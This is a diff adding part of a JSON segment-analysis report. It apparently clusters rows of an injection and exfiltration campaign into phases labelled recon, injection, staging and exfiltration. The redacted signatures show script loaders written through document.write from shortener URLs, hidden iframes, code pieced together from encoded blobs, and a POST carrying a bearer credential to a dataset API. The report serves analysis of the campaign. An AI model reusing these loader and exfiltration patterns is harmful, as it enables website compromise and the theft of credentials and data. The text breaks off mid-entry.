+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG028",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "x+='[redacted:opaque_fragment:<N>]';document.write('<script src=[shortener url <N>]",
+      "sample_count": 977,
+      "coverage_ratio": 0.005218,
+      "representative_ids": [
+        "R0064754",
+        "R0064758",
+        "R0064771",
+        "R0064777",
+        "R0064793",
+        "R0064796",
+        "R0064812",
+        "R0064815"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:opaque_fragment:000056]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12766]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000379]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12779]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000380]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12783]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000381]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12778]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG029",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "x+='[redacted sensitive content]';document.write('<script src=[shortener url <N>]><\\/script>')",
+      "sample_count": 957,
+      "coverage_ratio": 0.005111,
+      "representative_ids": [
+        "R0054230",
+        "R0054352",
+        "R0054355",
+        "R0054361",
+        "R0054364",
+        "R0054370",
+        "R0054371",
+        "R0054376"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED SENSITIVE CONTENT]",
+          8
+        ],
+        [
+          "[SHORTENER URL 9950]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12766]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12778]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12779]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12780]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12781]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12782]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG030",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "<!doctype html> <html lang=en> <title>redirecting...</title> <h<N>>redirecting...</h<N>> <p>you should be redirected automatically to the target url: <a href=\"[redirect url <N>]\">[redirect url <N>]</a>. if not, click the link.",
+      "sample_count": 914,
+      "coverage_ratio": 0.004881,
+      "representative_ids": [
+        "R0053433",
+        "R0053444",
+        "R0053455",
+        "R0053466",
+        "R0053633",
+        "R0053634",
+        "R0053637",
+        "R0054145"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDIRECT URL 122]",
+          2
+        ],
+        [
+          "[REDIRECT URL 123]",
+          2
+        ],
+        [
+          "[REDIRECT URL 124]",
+          2
+        ],
+        [
+          "[REDIRECT URL 125]",
+          2
+        ],
+        [
+          "[REDIRECT URL 126]",
+          2
+        ],
+        [
+          "[REDIRECT URL 127]",
+          2
+        ],
+        [
+          "[REDIRECT URL 128]",
+          2
+        ],
+        [
+          "[REDIRECT URL 132]",
+          2
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG031",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[proxy <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] x+='[redacted sensitive content]';document.write('<script src=[shortener url <N>]><\\/script>')",
+      "sample_count": 864,
+      "coverage_ratio": 0.004614,
+      "representative_ids": [
+        "R0122540",
+        "R0122572",
+        "R0122636",
+        "R0122705",
+        "R0122713",
+        "R0122715",
+        "R0122764",
+        "R0122886"
+      ],
+      "top_marker_strings": [
+        [
+          "[PROXY 4 URL 72]",
+          8
+        ],
+        [
+          "[REDACTED SENSITIVE CONTENT]",
+          8
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000007]",
+          4
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000004]",
+          2
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000008]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 76793]",
+          1
+        ],
+        [
+          "[SHORTENER URL 137729]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 76825]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG032",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "x+='[redacted:opaque_fragment:<N>]';document.write('<script src=[shortener url <N>]><\\/script>')",
+      "sample_count": 799,
+      "coverage_ratio": 0.004267,
+      "representative_ids": [
+        "R0054430",
+        "R0054435",
+        "R0054439",
+        "R0054442",
+        "R0055273",
+        "R0055278",
+        "R0055281",
+        "R0055290"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:opaque_fragment:000265]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12826]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000266]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12827]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000054]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12828]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000267]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12829]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG033",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[proxy <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] [encoded blob <N>]",
+      "sample_count": 775,
+      "coverage_ratio": 0.004139,
+      "representative_ids": [
+        "R0118969",
+        "R0118982",
+        "R0118991",
+        "R0118994",
+        "R0118999",
+        "R0119001",
+        "R0119006",
+        "R0119018"
+      ],
+      "top_marker_strings": [
+        [
+          "[PROXY 4 URL 72]",
+          8
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000015]",
+          3
+        ],
+        [
+          "[ENCODED BLOB 73100]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:001113]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73101]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73112]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:001114]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73113]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG034",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] x+='[redacted sensitive content]';n('[redacted:opaque_fragment:<N>]')",
+      "sample_count": 743,
+      "coverage_ratio": 0.003968,
+      "representative_ids": [
+        "R0122709",
+        "R0122730",
+        "R0122748",
+        "R0122812",
+        "R0122827",
+        "R0122838",
+        "R0122853",
+        "R0122898"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED SENSITIVE CONTENT]",
+          8
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000008]",
+          7
+        ],
+        [
+          "[SERVICE 3 URL 209]",
+          6
+        ],
+        [
+          "[SERVICE 3 URL 245]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 76980]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:004100]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 76994]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:004102]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG035",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "x+='[redacted sensitive content]';n('//[shortener url <N>]')",
+      "sample_count": 683,
+      "coverage_ratio": 0.003648,
+      "representative_ids": [
+        "R0051822",
+        "R0051823",
+        "R0058943",
+        "R0059372",
+        "R0065699",
+        "R0065701",
+        "R0065702",
+        "R0065703"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED SENSITIVE CONTENT]",
+          8
+        ],
+        [
+          "[SHORTENER URL 12749]",
+          1
+        ],
+        [
+          "[SHORTENER URL 83725]",
+          1
+        ],
+        [
+          "[SHORTENER URL 45527]",
+          1
+        ],
+        [
+          "[SHORTENER URL 50403]",
+          1
+        ],
+        [
+          "[SHORTENER URL 14299]",
+          1
+        ],
+        [
+          "[SHORTENER URL 14311]",
+          1
+        ],
+        [
+          "[SHORTENER URL 14312]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG036",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "[proxy <N> url <N>][encoded blob <N>] [encoded blob <N>]",
+      "sample_count": 681,
+      "coverage_ratio": 0.003637,
+      "representative_ids": [
+        "R0118977",
+        "R0118989",
+        "R0119003",
+        "R0119010",
+        "R0119013",
+        "R0119085",
+        "R0119093",
+        "R0119096"
+      ],
+      "top_marker_strings": [
+        [
+          "[PROXY 4 URL 72]",
+          8
+        ],
+        [
+          "[ENCODED BLOB 73106]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73107]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73118]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73119]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73133]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73134]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73141]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG037",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] x+='[encoded blob <N>]';n('[redacted:opaque_fragment:<N>]')",
+      "sample_count": 680,
+      "coverage_ratio": 0.003632,
+      "representative_ids": [
+        "R0119068",
+        "R0119151",
+        "R0119240",
+        "R0119364",
+        "R0119560",
+        "R0120006",
+        "R0120039",
+        "R0120147"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 3 URL 209]",
+          8
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000015]",
+          4
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000008]",
+          4
+        ],
+        [
+          "[ENCODED BLOB 73211]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73212]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003341]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73287]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73288]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG038",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "document.write('<script src=[redacted:destination:<N>][shortener url <N>]></script><script src=[redacted:destination:<N>][shortener url <N>]></script>')",
+      "sample_count": 650,
+      "coverage_ratio": 0.003471,
+      "representative_ids": [
+        "R0000312",
+        "R0000343",
+        "R0000346",
+        "R0000370",
+        "R0000391",
+        "R0000398",
+        "R0000403",
+        "R0000428"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000003]",
+          16
+        ],
+        [
+          "[SHORTENER URL 34]",
+          8
+        ],
+        [
+          "[SHORTENER URL 35]",
+          1
+        ],
+        [
+          "[SHORTENER URL 41]",
+          1
+        ],
+        [
+          "[SHORTENER URL 42]",
+          1
+        ],
+        [
+          "[SHORTENER URL 44]",
+          1
+        ],
+        [
+          "[SHORTENER URL 48]",
+          1
+        ],
+        [
+          "[SHORTENER URL 49]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG039",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "agent_id\\\":\\\"[redacted:runtime_identifier]\\\",\\\"checksum\\\":\\\"[redacted:source_identifier:<N>]",
+      "sample_count": 625,
+      "coverage_ratio": 0.003338,
+      "representative_ids": [
+        "R0083663",
+        "R0083679",
+        "R0083685",
+        "R0083726",
+        "R0083747",
+        "R0083755",
+        "R0083885",
+        "R0083913"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:runtime_identifier]",
+          8
+        ],
+        [
+          "[REDACTED:source_identifier:006399]",
+          1
+        ],
+        [
+          "[REDACTED:source_identifier:006403]",
+          1
+        ],
+        [
+          "[REDACTED:source_identifier:006404]",
+          1
+        ],
+        [
+          "[REDACTED:source_identifier:006410]",
+          1
+        ],
+        [
+          "[REDACTED:source_identifier:006416]",
+          1
+        ],
+        [
+          "[REDACTED:source_identifier:006417]",
+          1
+        ],
+        [
+          "[REDACTED:source_identifier:006431]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG040",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "x+='[redacted sensitive content]';document.write('<script src=[shortener url <N>]><\\/script",
+      "sample_count": 586,
+      "coverage_ratio": 0.00313,
+      "representative_ids": [
+        "R0064386",
+        "R0064874",
+        "R0064919",
+        "R0067299",
+        "R0067312",
+        "R0067315",
+        "R0067351",
+        "R0067354"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED SENSITIVE CONTENT]",
+          8
+        ],
+        [
+          "[SHORTENER URL 9950]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12829]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12854]",
+          1
+        ],
+        [
+          "[SHORTENER URL 23480]",
+          1
+        ],
+        [
+          "[SHORTENER URL 23477]",
+          1
+        ],
+        [
+          "[SHORTENER URL 23478]",
+          1
+        ],
+        [
+          "[SHORTENER URL 23581]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG041",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "[proxy <N> url <N>][encoded blob <N>]",
+      "sample_count": 582,
+      "coverage_ratio": 0.003108,
+      "representative_ids": [
+        "R0054350",
+        "R0054356",
+        "R0054362",
+        "R0054374",
+        "R0054377",
+        "R0054382",
+        "R0054395",
+        "R0054409"
+      ],
+      "top_marker_strings": [
+        [
+          "[PROXY 4 URL 72]",
+          8
+        ],
+        [
+          "[ENCODED BLOB 1964]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1966]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1968]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1972]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1974]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1976]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1982]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG042",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>] x+='[redacted sensitive content]';n('[redacted:opaque_fragment:<N>]')",
+      "sample_count": 573,
+      "coverage_ratio": 0.00306,
+      "representative_ids": [
+        "R0122607",
+        "R0122654",
+        "R0122814",
+        "R0122852",
+        "R0122939",
+        "R0122959",
+        "R0122963",
+        "R0123006"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED SENSITIVE CONTENT]",
+          8
+        ],
+        [
+          "[SERVICE 3 URL 209]",
+          7
+        ],
+        [
+          "[ENCODED BLOB 76864]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:004092]",
+          1
+        ],
+        [
+          "[SERVICE 3 URL 245]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 76915]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:004098]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 77082]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG043",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "x+='[redacted sensitive content]';document.write('<script src=[shortener url <N>]",
+      "sample_count": 555,
+      "coverage_ratio": 0.002964,
+      "representative_ids": [
+        "R0067313",
+        "R0067362",
+        "R0067617",
+        "R0067623",
+        "R0067652",
+        "R0067757",
+        "R0068042",
+        "R0069405"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED SENSITIVE CONTENT]",
+          8
+        ],
+        [
+          "[SHORTENER URL 23479]",
+          1
+        ],
+        [
+          "[SHORTENER URL 23582]",
+          1
+        ],
+        [
+          "[SHORTENER URL 24632]",
+          1
+        ],
+        [
+          "[SHORTENER URL 24655]",
+          1
+        ],
+        [
+          "[SHORTENER URL 24690]",
+          1
+        ],
+        [
+          "[SHORTENER URL 24906]",
+          1
+        ],
+        [
+          "[SHORTENER URL 25836]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG044",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>] x+='[encoded blob <N>]';n('[redacted:opaque_fragment:<N>]')",
+      "sample_count": 549,
+      "coverage_ratio": 0.002932,
+      "representative_ids": [
+        "R0119009",
+        "R0119103",
+        "R0119238",
+        "R0119266",
+        "R0119326",
+        "R0119455",
+        "R0119757",
+        "R0120156"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 3 URL 209]",
+          8
+        ],
+        [
+          "[ENCODED BLOB 73139]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73140]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003329]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73241]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73242]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003347]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73377]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG045",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "x[<N>]='[encoded blob <N>]';if(++k==<N>)z()",
+      "sample_count": 536,
+      "coverage_ratio": 0.002863,
+      "representative_ids": [
+        "R0013476",
+        "R0013896",
+        "R0013897",
+        "R0015306",
+        "R0015307",
+        "R0015466",
+        "R0015467",
+        "R0015472"
+      ],
+      "top_marker_strings": [
+        [
+          "[3]",
+          3
+        ],
+        [
+          "[6]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 6327]",
+          1
+        ],
+        [
+          "[7]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 6898]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 6899]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 7918]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 7919]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG046",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "http://[redacted:destination:<N>]]",
+      "sample_count": 533,
+      "coverage_ratio": 0.002847,
+      "representative_ids": [
+        "R0052773",
+        "R0052774",
+        "R0052775",
+        "R0052776",
+        "R0052777",
+        "R0052778",
+        "R0052779",
+        "R0052781"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:008371]",
+          1
+        ],
+        [
+          "[REDACTED:destination:008373]",
+          1
+        ],
+        [
+          "[REDACTED:destination:008375]",
+          1
+        ],
+        [
+          "[REDACTED:destination:008377]",
+          1
+        ],
+        [
+          "[REDACTED:destination:008379]",
+          1
+        ],
+        [
+          "[REDACTED:destination:008381]",
+          1
+        ],
+        [
+          "[REDACTED:destination:008383]",
+          1
+        ],
+        [
+          "[REDACTED:destination:008385]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG047",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "http://[redacted:destination:<N>]",
+      "sample_count": 527,
+      "coverage_ratio": 0.002815,
+      "representative_ids": [
+        "R0006845",
+        "R0008231",
+        "R0008232",
+        "R0008233",
+        "R0008235",
+        "R0008237",
+        "R0054339",
+        "R0055127"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000586]",
+          2
+        ],
+        [
+          "[REDACTED:destination:000755]",
+          2
+        ],
+        [
+          "[REDACTED:destination:000756]",
+          1
+        ],
+        [
+          "[REDACTED:destination:000757]",
+          1
+        ],
+        [
+          "[REDACTED:destination:000758]",
+          1
+        ],
+        [
+          "[REDACTED:destination:000759]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG048",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "n=s=>document.write('<script src=[redacted:destination:<N>][shortener-<N>-host]'+s+'><\\/script>');x='';n('[shortener code <N>]')",
+      "sample_count": 504,
+      "coverage_ratio": 0.002692,
+      "representative_ids": [
+        "R0001377",
+        "R0009784",
+        "R0010352",
+        "R0010357",
+        "R0010392",
+        "R0012345",
+        "R0012398",
+        "R0012518"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000003]",
+          8
+        ],
+        [
+          "[SHORTENER-1-HOST]",
+          8
+        ],
+        [
+          "[SHORTENER CODE 488]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 15660]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 16438]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 16442]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 16484]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 19037]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG049",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "<iframe src=[redacted:destination:<N>][shortener url <N>]></iframe><iframe src=[redacted:destination:<N>][shortener url <N>]></iframe>",
+      "sample_count": 496,
+      "coverage_ratio": 0.002649,
+      "representative_ids": [
+        "R0001358",
+        "R0001360",
+        "R0001362",
+        "R0001363",
+        "R0001364",
+        "R0001365",
+        "R0002070",
+        "R0002074"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000003]",
+          16
+        ],
+        [
+          "[SHORTENER URL 476]",
+          1
+        ],
+        [
+          "[SHORTENER URL 477]",
+          1
+        ],
+        [
+          "[SHORTENER URL 478]",
+          1
+        ],
+        [
+          "[SHORTENER URL 479]",
+          1
+        ],
+        [
+          "[SHORTENER URL 480]",
+          1
+        ],
+        [
+          "[SHORTENER URL 481]",
+          1
+        ],
+        [
+          "[SHORTENER URL 482]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG050",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "https://huggingface.co/datasets/[redacted:destination:<N>]",
+      "sample_count": 489,
+      "coverage_ratio": 0.002612,
+      "representative_ids": [
+        "R0000155",
+        "R0000156",
+        "R0000158",
+        "R0000161",
+        "R0000314",
+        "R0000474",
+        "R0012130",
+        "R0012235"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000020]",
+          3
+        ],
+        [
+          "[REDACTED:destination:000021]",
+          1
+        ],
+        [
+          "[REDACTED:destination:000029]",
+          1
+        ],
+        [
+          "[REDACTED:destination:000046]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001595]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001462]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG051",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "x=new xmlhttprequest;x.open('post','https://huggingface.co/api/datasets/[redacted:destination:<N>]',false);x.setrequestheader('authorization','bearer [credential <N>]');x.setrequestheader('content-type','application/x-ndjson');x.send(\"{\\\"key\\\":\\\"header\\\",\\\"val",
+      "sample_count": 488,
+      "coverage_ratio": 0.002606,
+      "representative_ids": [
+        "R0014079",
+        "R0015444",
+        "R0015828",
+        "R0015902",
+        "R0016438",
+        "R0016444",
+        "R0016538",
+        "R0016546"
+      ],
+      "top_marker_strings": [
+        [
+          "[CREDENTIAL 169]",
+          8
+        ],
+        [
+          "[REDACTED:destination:001776]",
+          2
+        ],
+        [
+          "[ENCODED BLOB]",
+          2
+        ],
+        [
+          "[REDACTED:destination:001594]",
+          2
+        ],
+        [
+          "[REDACTED:destination:001816]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001851]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001673]",
+          1
+        ],
+        [
+          "[REDACTED:destination:002201]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG052",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "x+='[encoded blob <N>]';n('[shortener code <N>]')",
+      "sample_count": 486,
+      "coverage_ratio": 0.002596,
+      "representative_ids": [
+        "R0003488",
+        "R0003489",
+        "R0003490",
+        "R0003491",
+        "R0003492",
+        "R0003493",
+        "R0003494",
+        "R0003495"
+      ],
+      "top_marker_strings": [
+        [
+          "[ENCODED BLOB 808]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 3780]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 809]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 3781]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 810]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 3782]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 811]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 3783]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG053",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "a[<N>]+='[encoded blob <N>]';n('//[shortener url <N>]')",
+      "sample_count": 483,
+      "coverage_ratio": 0.00258,
+      "representative_ids": [
+        "R0002348",
+        "R0002352",
+        "R0002356",
+        "R0002360",
+        "R0002362",
+        "R0002442",
+        "R0002444",
+        "R0002447"
+      ],
+      "top_marker_strings": [
+        [
+          "[0]",
+          3
+        ],
+        [
+          "[1]",
+          2
+        ],
+        [
+          "[2]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 284]",
+          1
+        ],
+        [
+          "[SHORTENER URL 2277]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 286]",
+          1
+        ],
+        [
+          "[SHORTENER URL 2289]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 288]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG054",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "https://datasets-server.huggingface.co/rows?dataset=[redacted:destination:<N>][redacted:destination:<N>][redacted:destination:<N>][redacted:query_value:<N>]",
+      "sample_count": 463,
+      "coverage_ratio": 0.002473,
+      "representative_ids": [
+        "R0007614",
+        "R0007993",
+        "R0008577",
+        "R0009184",
+        "R0010501",
+        "R0011172",
+        "R0011450",
+        "R0011474"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000281]",
+          7
+        ],
+        [
+          "[REDACTED:query_value:000102]",
+          5
+        ],
+        [
+          "[REDACTED:destination:000280]",
+          3
+        ],
+        [
+          "[REDACTED:destination:000592]",
+          3
